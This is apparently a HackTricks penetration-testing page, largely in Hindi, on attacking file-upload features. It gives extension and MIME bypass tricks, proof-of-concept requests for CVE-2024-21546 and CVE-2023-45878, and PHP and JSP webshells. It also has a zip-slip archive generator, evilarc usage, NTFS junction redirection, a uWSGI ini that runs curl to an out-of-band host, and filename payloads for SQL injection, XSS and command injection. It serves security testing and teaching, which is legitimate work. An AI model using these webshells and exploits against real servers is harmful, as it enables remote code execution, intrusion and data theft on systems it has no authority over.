# फ़ाइल अपलोड

{{#include ../../banners/hacktricks-training.md}}

## फ़ाइल अपलोड सामान्य कार्यप्रणाली

Other useful extensions:

- **PHP**: _.php_, _.php2_, _.php3_, ._php4_, ._php5_, ._php6_, ._php7_, .phps, ._pht_, ._phtm, .phtml_, ._pgif_, _.shtml, .htaccess, .phar, .inc, .hphp, .ctp, .module_
- **Working in PHPv8**: _.php_, _.php4_, _.php5_, .phtml_, .module_, .inc_, .hphp_, .ctp_
- **ASP**: _.asp, .aspx, .config, .ashx, .asmx, .aspq, .axd, .cshtm, .cshtml, .rem, .soap, .vbhtm, .vbhtml, .asa, .cer, .shtml_
- **Jsp:** _.jsp, .jspx, .jsw, .jsv, .jspf, .wss, .do, .action_
- **Coldfusion:** _.cfm, .cfml, .cfc, .dbm_
- **Flash**: _.swf_
- **Perl**: _.pl, .cgi_
- **Erlang Yaws Web Server**: _.yaws_

### फ़ाइल एक्सटेंशन जाँच को बायपास करना

1. अगर लागू हों, तो **पिछले एक्सटेंशन्स की जाँच करें।** साथ ही उन्हें कुछ **uppercase letters** के साथ भी टेस्ट करें: _pHp, .pHP5, .PhAr ..._
2. _परखें **एक वैध एक्सटेंशन को execution extension से पहले जोड़ना** (पिछले एक्सटेंशन्स का भी उपयोग करें):_
- _file.png.php_
- _file.png.Php5_
3. अंतिम में **विशेष characters जोड़कर** कोशिश करें। आप Burp का उपयोग करके सारे **ascii** और **Unicode** characters को **bruteforce** कर सकते हैं। (_नोट: आप ऊपर बताये गए **extensions** का भी उपयोग कर सकते हैं_)
- _file.php%20_
- _file.php%0a_
- _file.php%00_
- _file.php%0d%0a_
- _file.php/_
- _file.php.\\_
- _file._
- _file.php...._
- _file.pHp5...._
4. सर्वर-साइड के extension parser को **धोखा देकर** सुरक्षा को बायपास करने की कोशिश करें, जैसे **extension को दोहराना** या एक्सटेंशन्स के बीच **जंक** डाटा (**null bytes**) डालना। _बेहतर payload तैयार करने के लिए आप ऊपर बताए गए एक्सटेंशन्स का भी उपयोग कर सकते हैं।_
- _file.png.php_
- _file.png.pHp5_
- _file.php#.png_
- _file.php%00.png_
- _file.php\x00.png_
- _file.php%0a.png_
- _file.php%0d%0a.png_
- _file.phpJunk123png_
5. ऊपर की जाँच में **और एक लेयर एक्सटेंशन्स जोड़ें**:
- _file.png.jpg.php_
- _file.php%00.png%00.jpg_
6. कोशिश करें कि **exec extension को वैध extension से पहले रखा जाए** और उम्मीद करें कि सर्वर misconfigured हो। (यह Apache misconfigurations का उपयोग करने में मददगार हो सकता है जहां किसी भी फाइल का extension **.php**, पर वह **जरूरी नहीं कि .php पर खत्म हो**, code execute कर सकता है):
- _ex: file.php.png_
7. **Windows** में **NTFS alternate data stream (ADS)** का उपयोग करें। इस स्थिति में, एक colon character ":" को forbidden extension के बाद और permitted extension से पहले डाला जाएगा। नतीजतन, सर्वर पर एक **खाली फाइल जिस पर forbidden extension है** बन जाएगी (उदाहरण: "file.asax:.jpg”). इस फाइल को बाद में उसके short filename जैसे तरीकों से edit किया जा सकता है। "**::$data**” पैटर्न का उपयोग non-empty फाइलें बनाने के लिए भी किया जा सकता है। इसलिए, इस पैटर्न के बाद एक dot character जोड़ना आगे की प्रतिबंधों को बायपास करने में उपयोगी हो सकता है (उदा. "file.asp::$data.”)
8. फ़ाइलनाम की सीमा तोड़ने की कोशिश करें। वैध extension कट जाता है और malicious PHP पीछे रह जाती है। AAA<--SNIP-->AAA.php

```
# Linux maximum 255 bytes
/usr/share/metasploit-framework/tools/exploit/pattern_create.rb -l 255
Aa0Aa1Aa2Aa3Aa4Aa5Aa6Aa7Aa8Aa9Ab0Ab1Ab2Ab3Ab4Ab5Ab6Ab7Ab8Ab9Ac0Ac1Ac2Ac3Ac4Ac5Ac6Ac7Ac8Ac9Ad0Ad1Ad2Ad3Ad4Ad5Ad6Ad7Ad8Ad9Ae0Ae1Ae2Ae3Ae4Af5Af6Af7Af8Af9Ag0Ag1Ag2Ag3Ag4Ag5Ag6Ag7Ag8Ag9Ah0Ah1Ah2Ah3Ah4Ah5Ah6Ah7Ah8Ah9Ai0Ai1Ai2Ai3Ai4 # minus 4 here and adding .png
# Upload the file and check response how many characters it alllows. Let's say 236
python -c 'print "A" * 232'
AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA
# Make the payload
AAA<--SNIP 232 A-->AAA.php.png
```

#### UniSharp Laravel Filemanager pre-2.9.1 (.php. trailing dot) – CVE-2024-21546

Some upload handlers trim or normalize trailing dot characters from the saved filename. In UniSharp’s Laravel Filemanager (unisharp/laravel-filemanager) versions before 2.9.1, you can bypass extension validation by:

- Using a valid image MIME and magic header (e.g., PNG’s `\x89PNG\r\n\x1a\n`).
- Naming the uploaded file with a PHP extension followed by a dot, e.g., `shell.php.`.
- The server strips the trailing dot and persists `shell.php`, which will execute if it’s placed in a web-served directory (default public storage like `/storage/files/`).

न्यूनतम PoC (Burp Repeater):
```http
POST /profile/avatar HTTP/1.1
Host: target
Content-Type: multipart/form-data; boundary=----WebKitFormBoundary

------WebKitFormBoundary
Content-Disposition: form-data; name="upload"; filename="0xdf.php."
Content-Type: image/png

\x89PNG\r\n\x1a\n<?php system($_GET['cmd']??'id'); ?>
------WebKitFormBoundary--
```
फिर सेव किए गए पथ पर पहुँचें (Laravel + LFM में सामान्य):
```
GET /storage/files/0xdf.php?cmd=id
```
### Bypass Content-Type, Magic Number, Compression & Resizing

- **Content-Type** चेक्स को बायपास करने के लिए **Content-Type** **header** का **value** सेट करें: _image/png_ , _text/plain , application/octet-stream_
1. Content-Type **wordlist**: [https://github.com/danielmiessler/SecLists/blob/master/Miscellaneous/Web/content-type.txt](https://github.com/danielmiessler/SecLists/blob/master/Miscellaneous/Web/content-type.txt)
- **magic number** चेक को बायपास करने के लिए फ़ाइल की शुरुआत में एक असली image के **bytes** जोड़ें ( _file_ कमांड को confuse करें)। या shell को **metadata** में डालें:\
`exiftool -Comment="<?php echo 'Command:'; if($_POST){system($_POST['cmd']);} __halt_compiler();" img.jpg`\
`\` या आप payload को सीधे किसी image में भी **introduce** कर सकते हैं:\
`echo '<?php system($_REQUEST['cmd']); ?>' >> img.png`
- यदि आपकी image पर **compression जोड़ी जा रही है**, जैसे कि कुछ standard PHP libraries जैसे [PHP-GD](https://www.php.net/manual/fr/book.image.php) का उपयोग करके, तो ऊपर बताई गई तकनीकें उपयोगी नहीं होंगी। हालाँकि, आप **PLTE chunk** [**technique defined here**](https://www.synacktiv.com/publications/persistent-php-payloads-in-pngs-how-to-inject-php-code-in-an-image-and-keep-it-there.html) का उपयोग करके कुछ टेक्स्ट insert कर सकते हैं जो **compression के बाद भी बच जाएगा**।
- [**Github with the code**](https://github.com/synacktiv/astrolock/blob/main/payloads/generators/gen_plte_png.php)
- वेब पेज image को **resizing** भी कर सकता है, उदाहरण के लिए PHP-GD फ़ंक्शंस `imagecopyresized` या `imagecopyresampled` का उपयोग करके। हालाँकि, आप **IDAT chunk** [**technique defined here**](https://www.synacktiv.com/publications/persistent-php-payloads-in-pngs-how-to-inject-php-code-in-an-image-and-keep-it-there.html) का उपयोग कर सकते हैं ताकि कुछ टेक्स्ट insert किया जा सके जो **compression के बाद भी बचा रहे**।
- [**Github with the code**](https://github.com/synacktiv/astrolock/blob/main/payloads/generators/gen_idat_png.php)
- एक और तकनीक जो image resizing को **सहन करने वाला** payload बनाती है, वह PHP-GD फ़ंक्शन `thumbnailImage` का उपयोग करती है। फिर भी, आप **tEXt chunk** [**technique defined here**](https://www.synacktiv.com/publications/persistent-php-payloads-in-pngs-how-to-inject-php-code-in-an-image-and-keep-it-there.html) का उपयोग करके टेक्स्ट insert कर सकते हैं जो **compression के बाद भी बचा रहेगा**।
- [**Github with the code**](https://github.com/synacktiv/astrolock/blob/main/payloads/generators/gen_tEXt_png.php)

### Other Tricks to check

- पहले से अपलोड की गई फ़ाइल का नाम बदलने (extension बदलने) की vulnerability ढूँढें।
- backdoor को execute करने के लिए किसी **Local File Inclusion** vulnerability को खोजें।
- **संभव सूचना लीक (Possible Information disclosure)**:
1. एक ही फ़ाइल को **कई बार** (और एक ही समय में) उसी **नाम** से अपलोड करें
2. उस फ़ाइल का नाम अपलोड करें जो किसी पहले से मौजूद **file** या **folder** के नाम जैसा हो
3. फ़ाइल का नाम `"." , "..", or "…"` रखें। उदाहरण के लिए, Apache में **Windows** पर, यदि application uploaded files को "/www/uploads/" डिरेक्टरी में सेव करता है, तो "." filename "/www/" डिरेक्टरी में एक फ़ाइल बनाएगा जिसका नाम uploads” होगा।
4. ऐसी फ़ाइल अपलोड करें जिसे आसानी से delete न किया जा सके जैसे **"…:.jpg"** in **NTFS**। (Windows)
5. **Windows** में invalid characters जैसे `|<>*?”` वाले नाम के साथ एक फ़ाइल अपलोड करें। (Windows)
6. **Windows** में reserved (forbidden) नामों का उपयोग कर के फ़ाइल अपलोड करें जैसे CON, PRN, AUX, NUL, COM1, COM2, COM3, COM4, COM5, COM6, COM7, COM8, COM9, LPT1, LPT2, LPT3, LPT4, LPT5, LPT6, LPT7, LPT8, and LPT9.
- यह भी कोशिश करें कि एक executable (.exe) या एक **.html** (कम संदिग्ध) अपलोड करें जो victim द्वारा गलती से खोले जाने पर कोड execute कर दे।

### Special extension tricks

यदि आप **PHP server** पर फ़ाइलें अपलोड करने की कोशिश कर रहे हैं, तो [take a look at the **.htaccess** trick to execute code](https://book.hacktricks.wiki/en/network-services-pentesting/pentesting-web/php-tricks-esp/index.html#code-execution).\
यदि आप **ASP server** पर फ़ाइलें अपलोड करने की कोशिश कर रहे हैं, तो [take a look at the **.config** trick to execute code](../../network-services-pentesting/pentesting-web/iis-internet-information-services.md#execute-config-files).

`.phar` फ़ाइलें `.jar` की तरह होती हैं java के लिए, पर php के लिए, और इन्हें **php file की तरह use** किया जा सकता है (php के साथ execute करना, या किसी script में include करना...)

`.inc` extension कभी-कभी php फाइलों के लिए इस्तेमाल होता है जो केवल **import files** के लिए होते हैं, इसलिए किसी बिंदु पर किसी ने इस extension को **execute करने की अनुमति दे दी** हो सकती है।

## **Jetty RCE**

यदि आप Jetty server में एक XML फ़ाइल upload कर पाते हैं तो आप [RCE प्राप्त कर सकते हैं क्योंकि **new *.xml and *.war are automatically processed**](https://twitter.com/ptswarm/status/1555184661751648256/photo/1)**।** जैसा कि निम्न चित्र में बताया गया है, XML फ़ाइल को `$JETTY_BASE/webapps/` में upload करें और shell की उम्मीद करें!

![https://twitter.com/ptswarm/status/1555184661751648256/photo/1](<../../images/image (1047).png>)

## **uWSGI RCE**

इस vulnerability की विस्तृत जांच के लिए मूल रिसर्च देखें: [uWSGI RCE Exploitation](https://blog.doyensec.com/2023/02/28/new-vector-for-dirty-arbitrary-file-write-2-rce.html).

Remote Command Execution (RCE) vulnerabilities uWSGI servers में exploit की जा सकती हैं यदि किसी के पास `.ini` configuration file को modify करने की क्षमता हो। uWSGI configuration files एक विशिष्ट syntax का उपयोग करते हैं "magic" variables, placeholders, और operators को शामिल करने के लिए। विशेष रूप से, '@' operator, जिसका उपयोग `@(filename)` के रूप में होता है, एक फ़ाइल की contents को include करने के लिए डिज़ाइन किया गया है। uWSGI में supported schemes में से "exec" scheme विशेष रूप से शक्तिशाली है, जो किसी process के standard output से data पढ़ने की अनुमति देता है। इस फ़ीचर का दुरुपयोग Remote Command Execution या Arbitrary File Write/Read के लिए किया जा सकता है जब `.ini` configuration file process की जाती है।

निम्नलिखित हानिकारक `uwsgi.ini` फाइल के उदाहरण पर विचार करें, जो विभिन्न schemes को प्रदर्शित करती है:
```ini
[uwsgi]
; read from a symbol
foo = @(sym://uwsgi_funny_function)
; read from binary appended data
bar = @(data://[REDACTED])
; read from http
test = @(http://[REDACTED])
; read from a file descriptor
content = @(fd://[REDACTED])
; read from a process stdout
body = @(exec://whoami)
; curl to exfil via collaborator
extra = @(exec://curl http://collaborator-unique-host.oastify.com)
; call a function returning a char *
characters = @(call://uwsgi_func)
```
पेलोड का निष्पादन configuration फ़ाइल की parsing के दौरान होता है। Configuration को सक्रिय और parsed होने के लिए, uWSGI प्रक्रिया को या तो पुनःस्टार्ट किया जाना चाहिए (संभवतः crash के बाद या Denial of Service attack के कारण) या फ़ाइल को auto-reload पर सेट किया जाना चाहिए। auto-reload फीचर, यदि सक्षम हो, परिवर्तनों का पता चलने पर निर्दिष्ट अंतराल पर फ़ाइल को reload कर देता है।

uWSGI की configuration फ़ाइल parsing की ढीली प्रकृति को समझना महत्वपूर्ण है। विशेष रूप से, यहाँ वर्णित पेलोड को एक बाइनरी फ़ाइल (जैसे image या PDF) में सम्मिलित किया जा सकता है, जिससे संभावित exploitation का दायरा और बढ़ जाता है।

### Gibbon LMS arbitrary file write to pre-auth RCE (CVE-2023-45878)

Gibbon LMS में एक unauthenticated endpoint web root के अंदर arbitrary file write की अनुमति देता है, जिससे एक PHP file drop करके pre-auth RCE हो सकती है। Vulnerable versions: up to and including 25.0.01.

- Endpoint: `/Gibbon-LMS/modules/Rubrics/rubrics_visualise_saveAjax.php`
- Method: POST
- Required params:
- `img`: data-URI-like string: `[mime];[name],[base64]` (server ignores type/name, base64-decodes the tail)
- `path`: destination filename relative to Gibbon install dir (e.g., `poc.php` or `0xdf.php`)
- `gibbonPersonID`: any non-empty value is accepted (e.g., `0000000001`)

Minimal PoC to write and read back a file:
```bash
# Prepare test payload
printf '0xdf was here!' | base64
# => MHhkZiB3YXMgaGVyZSEK

# Write poc.php via unauth POST
curl http://target/Gibbon-LMS/modules/Rubrics/rubrics_visualise_saveAjax.php \
-d 'img=image/png;test,MHhkZiB3YXMgaGVyZSEK&path=poc.php&gibbonPersonID=0000000001'

# Verify write
curl http://target/Gibbon-LMS/poc.php
```
एक मिनिमल webshell ड्रॉप करें और commands को execute करें:
```bash
# '<?php system($_GET["cmd"]); ?>' base64
# PD9waHAgIHN5c3RlbSgkX0dFVFsiY21kIl0pOyA/Pg==

curl http://target/Gibbon-LMS/modules/Rubrics/rubrics_visualise_saveAjax.php \
-d 'img=image/png;foo,PD9waHAgIHN5c3RlbSgkX0dFVFsiY21kIl0pOyA/Pg==&path=shell.php&gibbonPersonID=0000000001'

curl 'http://target/Gibbon-LMS/shell.php?cmd=whoami'
```
Notes:
- हैंडलर `base64_decode($_POST["img"])` को `;` और `,` से split करने के बाद चलाता है, फिर extension/type को validate किए बिना बाइट्स को `$absolutePath . '/' . $_POST['path']` में लिख देता है।
- परिणामी कोड वेब सर्विस यूजर के रूप में चलता है (उदाहरण के लिए, XAMPP Apache on Windows)।

References for this bug include the usd HeroLab advisory and the NVD entry. See the References section below.

## **wget File Upload/SSRF Trick**

कुछ मामलों में आप पाएंगे कि सर्वर फाइलें डाउनलोड करने के लिए **`wget`** का उपयोग कर रहा है और आप **URL** संकेत कर सकते हैं। इन स्थितियों में, कोड यह जाँच सकता है कि डाउनलोड की गई फाइलों का extension एक **whitelist** में है ताकि केवल अनुमत फाइलें ही डाउनलोड हों। हालांकि, **यह चेक bypass किया जा सकता है।**\
**linux** में एक **filename** की अधिकतम लंबाई **255** है, परंतु **wget** फ़ाइल नामों को **236** characters तक truncate कर देता है। आप **download** कर सकते हैं एक फ़ाइल जिसका नाम "A"*232+".php"+".gif" है, यह filename **check** को **bypass** कर देगा (जैसा कि इस उदाहरण में **".gif"** एक **valid** extension है) पर `wget` उस फ़ाइल का नाम बदलकर **"A"*232+".php"** कर देगा।
```bash
#Create file and HTTP server
echo "SOMETHING" > $(python -c 'print("A"*(236-4)+".php"+".gif")')
python3 -m http.server 9080
```

```bash
#Download the file
wget 127.0.0.1:9080/$(python -c 'print("A"*(236-4)+".php"+".gif")')
The name is too long, 240 chars total.
Trying to shorten...
New name is AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA.php.
--2020-06-13 03:14:06--  http://127.0.0.1:9080/AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA.php.gif
Connecting to 127.0.0.1:9080... connected.
HTTP request sent, awaiting response... 200 OK
Length: 10 [image/gif]
Saving to: ‘AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA.php’

AAAAAAAAAAAAAAAAAAAAAAAAAAAAA 100%[===============================================>]      10  --.-KB/s    in 0s

2020-06-13 03:14:06 (1.96 MB/s) - ‘AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA.php’ saved [10/10]
```
Note that **another option** you may be thinking of to bypass this check is to make the **HTTP server redirect to a different file**, so the initial URL will bypass the check by then wget will download the redirected file with the new name. This **won't work** **unless** wget is being used with the **parameter** `--trust-server-names` because **wget will download the redirected page with the name of the file indicated in the original URL**.

### अपलोड डायरेक्टरी को NTFS junctions (Windows) के माध्यम से एस्केप करना

(इस attack के लिए आपको उस Windows मशीन तक local access चाहिए होगा) जब uploads Windows पर per-user subfolders में स्टोर होते हैं (उदा., C:\Windows\Tasks\Uploads\<id>\) और आप उस subfolder के creation/deletion को नियंत्रित कर सकते हैं, तो आप उसे directory junction से बदल सकते हैं जो किसी sensitive location (उदा., the webroot) की ओर पॉइंट करता है। उसके बाद की uploads target path में लिख दी जाएँगी, जिससे code execution संभव हो सकता है यदि target server‑side code को interpret करता है।

Example flow to redirect uploads into XAMPP webroot:
```cmd
:: 1) Upload once to learn/confirm your per-user folder name (e.g., md5 of form fields)
::    Observe it on disk: C:\Windows\Tasks\Uploads\33d81ad509ef34a2635903babb285882

:: 2) Remove the created folder and create a junction to webroot
rmdir C:\Windows\Tasks\Uploads\33d81ad509ef34a2635903babb285882
cmd /c mklink /J C:\Windows\Tasks\Uploads\33d81ad509ef34a2635903babb285882 C:\xampp\htdocs

:: 3) Re-upload your payload; it lands under C:\xampp\htdocs
::    Minimal PHP webshell for testing
::    <?php echo shell_exec($_REQUEST['cmd']); ?>

:: 4) Trigger
curl "http://TARGET/shell.php?cmd=whoami"
```
नोट्स
- mklink /J creates an NTFS directory junction (reparse point). वेब सर्वर का अकाउंट junction को follow कर सके और destination में write permission होना चाहिए।
- यह arbitrary file writes को redirect करता है; अगर destination scripts (PHP/ASP) execute करता है, तो यह RCE बन जाता है।
- Defenses: writable upload roots को attacker‑controllable न होने दें खासकर C:\Windows\Tasks जैसी जगहों के तहत; junction creation को block करें; extensions को server‑side validate करें; uploads को अलग volume पर स्टोर करें या deny‑execute ACLs लागू करें।

### GZIP-compressed body upload + path traversal in destination param → JSP webshell RCE (Tomcat)

कुछ upload/ingest handlers raw request body को ऐसे filesystem path पर लिखते हैं जिसे user-controlled query parameters से बनाया गया होता है। यदि handler Content-Encoding: gzip को भी सपोर्ट करता है और destination path को canonicalize/validate करने में विफल रहता है, तो आप directory traversal को एक gzipped payload के साथ जोड़कर arbitrary bytes को किसी web-served directory में लिख सकते हैं और RCE प्राप्त कर सकते हैं (उदा., Tomcat के webapps में एक JSP डालना)।

Generic exploitation flow:
- अपने server-side payload (उदा., minimal JSP webshell) तैयार करें और bytes को gzip-compress करें।
- एक POST भेजें जहाँ एक path parameter (उदा., token) में intended folder से बाहर निकलने वाला traversal हो, और file उस filename को दर्शाता है जिसे persist करना है। Set Content-Type: application/octet-stream और Content-Encoding: gzip; body compressed payload होगा।
- execution को trigger करने के लिए लिखी गयी file को ब्राउज़ करें।

Illustrative request:
```http
POST /fileupload?token=..%2f..%2f..%2f..%2fopt%2ftomcat%2fwebapps%2fROOT%2Fjsp%2F&file=shell.jsp HTTP/1.1
Host: target
Content-Type: application/octet-stream
Content-Encoding: gzip
Content-Length: <len>

<gzip-compressed-bytes-of-your-jsp>
```
फिर ट्रिगर करें:
```http
GET /jsp/shell.jsp?cmd=id HTTP/1.1
Host: target
```
नोट्स
- लक्ष्य पाथ इंस्टॉल के अनुसार बदलते हैं (उदा., /opt/TRUfusion/web/tomcat/webapps/trufusionPortal/jsp/ in some stacks)। कोई भी वेब-एक्सपोज्ड फ़ोल्डर जो JSP चलाता है काम करेगा.
- Burp Suite’s Hackvertor extension आपके payload से सही gzip body बना सकता है.
- यह एक शुद्ध pre-auth arbitrary file write → RCE पैटर्न है; यह multipart parsing पर निर्भर नहीं करता.

रोकथाम
- Upload गंतव्यों को server-side पर निर्धारित करें; clients से path fragments पर कभी भरोसा न करें.
- Canonicalize करें और सुनिश्चित करें कि resolved path allow-listed base directory के भीतर ही रहे.
- Uploads को non-executable volume पर स्टोर करें और writable paths से script execution को रोकें.

## उपकरण

- [Upload Bypass](https://github.com/sAjibuu/Upload_Bypass) is a powerful tool designed to assist Pentesters and Bug Hunters in testing file upload mechanisms. It leverages various bug bounty techniques to simplify the process of identifying and exploiting vulnerabilities, ensuring thorough assessments of web applications.

### snprintf quirks के साथ upload indices को करप्ट करना (historical)

कुछ legacy upload handlers जो `snprintf()` या इसी तरह का उपयोग करके single-file upload से multi-file arrays बनाते हैं, उन्हें `_FILES` संरचना को फ़ोर्ज करने के लिए धोखा दिया जा सकता है। `snprintf()` व्यवहार में inconsistencies और truncation के कारण, सावधानीपूर्वक तैयार एक single upload सर्वर साइड पर कई indexed files की तरह दिखाई दे सकता है, जिससे वह logic भ्रमित हो जाता है जो एक strict shape मानता है (उदा., इसे multi-file upload समझना और unsafe branches लेना)। हालांकि आज यह niche है, यह “index corruption” पैटर्न कभी-कभी CTFs और पुराने कोडबेस में फिर से उभरता है।

## File upload से अन्य vulnerabilities तक

- **filename** को `../../../tmp/lol.png` पर सेट करें और **path traversal** हासिल करने की कोशिश करें
- **filename** को `sleep(10)-- -.jpg` पर सेट करें और आप **SQL injection** हासिल कर सकते हैं
- **filename** को `<svg onload=alert(document.domain)>` पर सेट करें ताकि **XSS** प्राप्त हो
- **filename** को `; sleep 10;` पर सेट करके कुछ command injection की जाँच करें (more [command injections tricks here](../command-injection.md))
- [**XSS** in image (svg) file upload](../xss-cross-site-scripting/index.html#xss-uploading-files-svg)
- **JS** file **upload** + **XSS** = [**Service Workers** exploitation](../xss-cross-site-scripting/index.html#xss-abusing-service-workers)
- [**XXE in svg upload**](../xxe-xee-xml-external-entity.md#svg-file-upload)
- [**Open Redirect** via uploading svg file](../open-redirect.md#open-redirect-uploading-svg-files)
- Try **different svg payloads** from [**https://github.com/allanlw/svg-cheatsheet**](https://github.com/allanlw/svg-cheatsheet)
- [Famous **ImageTrick** vulnerability](https://mukarramkhalid.com/imagemagick-imagetragick-exploit/)
- If you can **indicate the web server to catch an image from a URL** you could try to abuse a [SSRF](../ssrf-server-side-request-forgery/index.html). If this **image** is going to be **saved** in some **public** site, you could also indicate a URL from [https://iplogger.org/invisible/](https://iplogger.org/invisible/) and **steal information of every visitor**.
- [**XXE and CORS** bypass with PDF-Adobe upload](pdf-upload-xxe-and-cors-bypass.md)
- Specially crafted PDFs to XSS: The [following page present how to **inject PDF data to obtain JS execution**](../xss-cross-site-scripting/pdf-injection.md). If you can upload PDFs you could prepare some PDF that will execute arbitrary JS following the given indications.
- Upload the \[eicar]\([**https://secure.eicar.org/eicar.com.txt**](https://secure.eicar.org/eicar.com.txt)) content to check if the server has any **antivirus**
- जांचें कि files upload करने पर कोई **size limit** तो नहीं है

Here’s a top 10 list of things that you can achieve by uploading (from [here](https://twitter.com/SalahHasoneh1/status/1281274120395685889)):

1. **ASP / ASPX / PHP5 / PHP / PHP3**: Webshell / RCE
2. **SVG**: Stored XSS / SSRF / XXE
3. **GIF**: Stored XSS / SSRF
4. **CSV**: CSV injection
5. **XML**: XXE
6. **AVI**: LFI / SSRF
7. **HTML / JS** : HTML injection / XSS / Open redirect
8. **PNG / JPEG**: Pixel flood attack (DoS)
9. **ZIP**: RCE via LFI / DoS
10. **PDF / PPTX**: SSRF / BLIND XXE

#### Burp Extension


{{#ref}}
https://github.com/portswigger/upload-scanner
{{#endref}}

## Magic Header Bytes

- **PNG**: `"\x89PNG\r\n\x1a\n\0\0\0\rIHDR\0\0\x03H\0\x s0\x03["`
- **JPG**: `"\xff\xd8\xff"`

अन्य filetypes के लिए Refer to [https://en.wikipedia.org/wiki/List_of_file_signatures](https://en.wikipedia.org/wiki/List_of_file_signatures)।

## Zip/Tar File Automatically decompressed Upload

यदि आप ऐसा ZIP upload कर सकते हैं जो सर्वर के अंदर decompressed किया जाएगा, तो आप 2 चीजें कर सकते हैं:

### Symlink

ऐसा लिंक upload करें जिसमें अन्य files के soft links हों, फिर decompressed files तक पहुँचने पर आप linked files तक पहुँचेंगे:
```
ln -s ../../../index.php symindex.txt
zip --symlinks test.zip symindex.txt
tar -cvf test.tar symindex.txt
```
### विभिन्न फ़ोल्डरों में Decompress

Decompression के दौरान डायरेक्टरीज़ में फ़ाइलों का अनपेक्षित निर्माण एक गंभीर समस्या है। प्रारंभिक मान्यताओं के बावजूद कि यह सेटअप malicious file uploads के माध्यम से OS-level command execution से सुरक्षा कर सकता है, ZIP archive format की hierarchical compression support और directory traversal क्षमताओं का शोषण किया जा सकता है। इससे attackers प्रतिबंधों को बायपास कर सकते हैं और targeted application की decompression functionality को manipulate करके secure upload directories से बाहर निकल सकते हैं।

ऐसी फ़ाइलें craft करने के लिए एक automated exploit [**evilarc on GitHub**](https://github.com/ptoomey3/evilarc) पर उपलब्ध है। इस utility का उपयोग इस प्रकार किया जा सकता है:
```python
# Listing available options
python2 evilarc.py -h
# Creating a malicious archive
python2 evilarc.py -o unix -d 5 -p /var/www/html/ rev.php
```
इसके अतिरिक्त, **symlink trick with evilarc** एक विकल्प है। यदि उद्देश्य `/flag.txt` जैसी फ़ाइल को लक्षित करना है, तो उस फ़ाइल के लिए आपके सिस्टम में एक symlink बनाया जाना चाहिए। यह सुनिश्चित करता है कि evilarc अपने संचालन के दौरान त्रुटियों का सामना न करे।

नीचे Python कोड का एक उदाहरण दिया गया है जो malicious zip file बनाने के लिए उपयोग किया गया है:
```python
#!/usr/bin/python
import zipfile
from io import BytesIO


def create_zip():
f = BytesIO()
z = zipfile.ZipFile(f, 'w', zipfile.ZIP_DEFLATED)
z.writestr('../../../../../var/www/html/webserver/shell.php', '<?php echo system($_REQUEST["cmd"]); ?>')
z.writestr('otherfile.xml', 'Content of the file')
z.close()
zip = open('poc.zip','wb')
zip.write(f.getvalue())
zip.close()

create_zip()
```
**Abusing compression for file spraying**

For further details **check the original post in**: [https://blog.silentsignal.eu/2014/01/31/file-upload-unzip/](https://blog.silentsignal.eu/2014/01/31/file-upload-unzip/)

1.  **Creating a PHP Shell**: PHP कोड लिखा जाता है जो `$_REQUEST` वेरिएबल के माध्यम से पास किए गए कमांड्स को निष्पादित करता है।

```php
<?php
if(isset($_REQUEST['cmd'])){
$cmd = ($_REQUEST['cmd']);
system($cmd);
}?>
```

2.  **File Spraying and Compressed File Creation**: कई फाइलें बनाई जाती हैं और इन फाइलों को शामिल करते हुए एक zip archive तैयार किया जाता है।

```bash
root@s2crew:/tmp# for i in `seq 1 10`;do FILE=$FILE"xxA"; cp simple-backdoor.php $FILE"cmd.php";done
root@s2crew:/tmp# zip cmd.zip xx*.php
```

3.  **Modification with a Hex Editor or vi**: zip के अंदर फाइलों के नाम vi या hex editor से बदल दिए जाते हैं, "xxA" को "../" से बदलकर directory traversal किया जाता है।

```bash
:set modifiable
:%s/xxA/../g
:x!
```

### ZIP NUL-byte filename smuggling (PHP ZipArchive confusion)

When a backend validates ZIP entries using PHP’s ZipArchive but extraction writes to the filesystem using raw names, you can smuggle a disallowed extension by inserting a NUL (0x00) into the filename fields. ZipArchive treats the entry name as a C‑string and truncates at the first NUL; the filesystem writes the full name, dropping everything after the NUL.

उच्च-स्तरीय प्रवाह:
- एक वैध container फ़ाइल तैयार करें (उदा., एक मान्य PDF) जिसमें एक छोटा PHP stub किसी stream में embedded हो ताकि magic/MIME PDF ही बनी रहे।
